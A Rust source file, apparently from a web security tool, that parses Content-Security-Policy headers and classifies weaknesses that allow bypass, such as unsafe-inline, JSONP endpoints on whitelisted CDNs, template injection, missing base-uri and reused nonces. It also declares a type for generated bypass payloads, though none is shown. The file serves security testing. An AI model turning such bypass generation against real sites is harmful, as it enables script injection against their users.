use std::collections::HashMap;
use std::fmt;

use serde::{Deserialize, Serialize};

/// A parsed Content-Security-Policy header broken into individual directives.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CspPolicy {
    pub directives: HashMap<CspDirective, Vec<String>>,
    pub report_only: bool,
}

/// Supported CSP directive types.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum CspDirective {
    DefaultSrc,
    ScriptSrc,
    StyleSrc,
    ImgSrc,
    ConnectSrc,
    FontSrc,
    ObjectSrc,
    MediaSrc,
    FrameSrc,
    ChildSrc,
    WorkerSrc,
    BaseUri,
    FormAction,
    FrameAncestors,
    ReportUri,
    ReportTo,
}

impl CspDirective {
    fn from_str_name(s: &str) -> Option<Self> {
        match s {
            "default-src" => Some(Self::DefaultSrc),
            "script-src" => Some(Self::ScriptSrc),
            "style-src" => Some(Self::StyleSrc),
            "img-src" => Some(Self::ImgSrc),
            "connect-src" => Some(Self::ConnectSrc),
            "font-src" => Some(Self::FontSrc),
            "object-src" => Some(Self::ObjectSrc),
            "media-src" => Some(Self::MediaSrc),
            "frame-src" => Some(Self::FrameSrc),
            "child-src" => Some(Self::ChildSrc),
            "worker-src" => Some(Self::WorkerSrc),
            "base-uri" => Some(Self::BaseUri),
            "form-action" => Some(Self::FormAction),
            "frame-ancestors" => Some(Self::FrameAncestors),
            "report-uri" => Some(Self::ReportUri),
            "report-to" => Some(Self::ReportTo),
            _ => None,
        }
    }
}

impl fmt::Display for CspDirective {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let name = match self {
            Self::DefaultSrc => "default-src",
            Self::ScriptSrc => "script-src",
            Self::StyleSrc => "style-src",
            Self::ImgSrc => "img-src",
            Self::ConnectSrc => "connect-src",
            Self::FontSrc => "font-src",
            Self::ObjectSrc => "object-src",
            Self::MediaSrc => "media-src",
            Self::FrameSrc => "frame-src",
            Self::ChildSrc => "child-src",
            Self::WorkerSrc => "worker-src",
            Self::BaseUri => "base-uri",
            Self::FormAction => "form-action",
            Self::FrameAncestors => "frame-ancestors",
            Self::ReportUri => "report-uri",
            Self::ReportTo => "report-to",
        };
        write!(f, "{name}")
    }
}

/// Categories of CSP weakness that can lead to bypass.
#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum CspWeakness {
    UnsafeInline,
    UnsafeEval,
    WildcardDomain {
        pattern: String,
    },
    JsonpEndpoint {
        domain: String,
        endpoint: String,
    },
    FrameworkTemplateInjection {
        framework: String,
        cdn_domain: String,
    },
    DataUri,
    BlobUri,
    MissingBaseUri,
    NonceReuse {
        nonce: String,
    },
    MissingObjectSrc,
}

impl fmt::Display for CspWeakness {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::UnsafeInline => write!(f, "unsafe-inline allows inline script execution"),
            Self::UnsafeEval => write!(f, "unsafe-eval allows eval-based script execution"),
            Self::WildcardDomain { pattern } => {
                write!(
                    f,
                    "wildcard domain {pattern} allows hosting on any subdomain"
                )
            }
            Self::JsonpEndpoint { domain, endpoint } => {
                write!(f, "JSONP endpoint on whitelisted CDN {domain}: {endpoint}")
            }
            Self::FrameworkTemplateInjection {
                framework,
                cdn_domain,
            } => {
                write!(
                    f,
                    "{framework} template injection via whitelisted CDN {cdn_domain}"
                )
            }
            Self::DataUri => write!(f, "data: URI allows base64-encoded script execution"),
            Self::BlobUri => write!(f, "blob: URI allows blob URL script execution"),
            Self::MissingBaseUri => {
                write!(
                    f,
                    "missing base-uri allows base tag injection for relative URL hijacking"
                )
            }
            Self::NonceReuse { nonce } => {
                write!(
                    f,
                    "predictable/reused nonce '{nonce}' enables nonce fixation"
                )
            }
            Self::MissingObjectSrc => {
                write!(f, "missing object-src allows plugin-based script execution")
            }
        }
    }
}

/// A generated bypass payload targeting a specific CSP weakness.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CspBypass {
    pub weakness: CspWeakness,
    pub payload: String,
    pub description: String,
}

